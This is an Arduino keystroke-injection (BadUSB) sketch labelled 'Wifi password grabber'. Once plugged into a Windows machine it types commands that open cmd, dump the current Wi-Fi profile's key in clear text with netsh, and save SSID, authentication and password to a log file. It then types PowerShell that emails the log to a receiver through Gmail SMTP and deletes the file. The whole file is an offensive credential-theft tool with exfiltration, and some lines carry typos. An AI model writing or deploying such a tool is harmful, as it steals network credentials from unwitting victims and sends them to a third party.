//Wifi password grabber
//Version:3
//Description:Saves the SSID,Networck type,authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
void setup() {
  Keyboard.begin();
  delay(3000);
//Minimize all windows and open run cmd
  Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.press('d');
  delay(200); 
  Keyboard.release('d');
  delay(200); 
  Keyboard.print("r");
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200); 
  //=========================cmd==========================
  Keyboard.println("cmd");
  delay(1000);
  //Gettting SSID
  Keyboard.println("CD \"%userprofile%\\dEsktop\" & FOR /F \"TOKENS=2 DELIMS=: \" %A in ('NETSH WLAN SHOW INTERFACE ^| FINDSTR \"SSID\" ^| FINDSTR /V \"bssid\"') DO SET a=%a");
  //Creating A.txt
  Keyboard.println("NETSH WLAH SHOW PROFILES %a% KEY=CLEAR | FINDSTR /C:\"nETWORK TYPE\" /C:\"aUTHENTICATION\" /C:\"kEY cONTENT\" | FINDSTR /V \"BROADCAST\" | FINDSTR /V \"rADIO\">>a.TXT");
  //Get network type
  Keyboard.println("FOR /F \"TOKENS=3 DELIMS=: \" %a IN ('FINDSTR \"nETWORK TYPE\" a.TXT') DO SET b=%a");
  //Get authentication
  Keyboard.println("FOR /F \"TOKENS=2 DELIMS=: \" %a IN ('FINDSTR \"aUTHENTICATION\" a.TXT') DO SET c=%a");
  //Get password
  Keyboard.println("FOR /F \"TOKENS=3 DELIMS=: \" %a IN ('FINDSTR \"kEY cONTENT\" a.TXT') DO SET d=%a");
  //Delete A.txt
  Keyboard.println("DEL a.TXT");
  //Create Log.txt
  Keyboard.println("ECHO ssid: %a%>>lOG.TXT & ECHO nETWORK TYPE: %b%>>lOG.TXT & ECHO aUTHENTICATION: %c%>>lOG.TXT & ECHO pASSWORD: %d%>>lOG.TXT");
  //Mail Log.txt
  Keyboard.println("POWERSHELL");
  Keyboard.println("$smtpiNFO = nEW-oBJECT nET.mAIL.sMTPcLIENT('SMTP.GMAIL.COM', 587)");
  Keyboard.println("$smtpiNFO.eNABLEsSL = $TRUE");
  Keyboard.println("$smtpiNFO.cREDENTIALS = nEW-oBJECT sYSTEM.nET.nETWORKcREDENTIAL('account@GMAIL.COM', 'password')");
  Keyboard.println("$rEPORTeMAIL = nEW-oBJECT sYSTEM.nET.mAIL.mAILmESSAGE");
  Keyboard.println("$rEPORTeMAIL.fROM = 'account@GMAIL.COM'");
  Keyboard.println("$rEPORTeMAIL.tO.aDD('receiver@GMAIL.COM')");
  Keyboard.println("$rEPORTeMAIL.sUBJECT = 'wIfI KET GRABBER'");
  Keyboard.println("$rEPORTeMAIL.bODY = (gET-cONTENT lOG.TXT | OUT-sTRING)");
  Keyboard.println("$smtpiNFO.sEND($rEPORTeMAIL)");
  Keyboard.println("EXIT");
  Keyboard.println("DEL lOG.TXT & EXIT")
  //======================================================
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}

void loop() {
}
